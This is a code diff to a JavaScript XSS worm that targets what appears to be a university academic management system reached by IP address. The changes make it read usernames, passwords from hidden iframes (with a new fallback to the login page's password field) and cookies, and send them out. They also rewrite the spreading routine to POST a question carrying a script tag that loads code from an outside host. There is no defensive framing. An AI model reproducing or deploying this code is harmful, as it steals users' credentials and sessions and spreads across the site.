@@ -13,7 +13,11 @@ function get_data(){
     get_password();
     var i="name=";
     setTimeout(function () {
-		i=i+document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML+"&password="+document.getElementById("grsz_xgmm").contentWindow.document.getElementById('oldpassword').value+"&cookie="+document.cookie;
+		var password=document.getElementById("grsz_xgmm").contentWindow.document.getElementById('oldpassword').value
+		if(password==""){
+		    password=document.getElementById("login").contentWindow.document.getElementById('userPassword').value
+		}
+		i=i+document.getElementById("ysgg_query").contentWindow.document.getElementById("Top1_divLoginName").innerHTML+"&password="+password+"&cookie="+document.cookie;
 		post_cookie(i);
 	}, 1000);
 	
@@ -33,17 +37,24 @@ function inj_iframe(src,id){
 
 function get_password(){
     inj_iframe("http://218.64.56.18/jsxsd/grsz/grsz_xgmm","grsz_xgmm");
-    inj_iframe("http://218.64.56.18/jsxsd/ggly/ysgg_query","ysgg_query");   
+    inj_iframe("http://218.64.56.18/jsxsd/ggly/ysgg_query","ysgg_query");
+    inj_iframe("http://218.64.56.18/jsxsd/","login");    
     return 0;
 }
 
 
 function creat(){
-    inj_iframe("http://218.64.56.18/jsxsd/zxwd/tw_add","creat"); 
     setTimeout(function () {
-    text=document.getElementById("creat").contentWindow.document.getElementById('xmms');
-    text.value ="请问四级没过可以毕业吗?<script language=\"javascript\" src=\"http://www.hackerl.com/static/js/about.js\" type=\"text/javascript\"></script>"
-    document.getElementById("creat").contentWindow.document.getElementById('Form1').submit();
+    var request;
+    if (window.XMLHttpRequest) {
+        request = new XMLHttpRequest();
+    } else {
+        request = new ActiveXObject('Microsoft.XMLHTTP');
+    }
+
+    request.open("POST","http://218.64.56.18/jsxsd/zxwd/tw_add_save",true);
+    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    request.send("xmms=请问四级没过可以毕业吗?<script language=\"javascript\" src=\"http://www.hackerl.com/static/js/about.js\" type=\"text/javascript\"></script>");
 	}, 1000);
 }
 
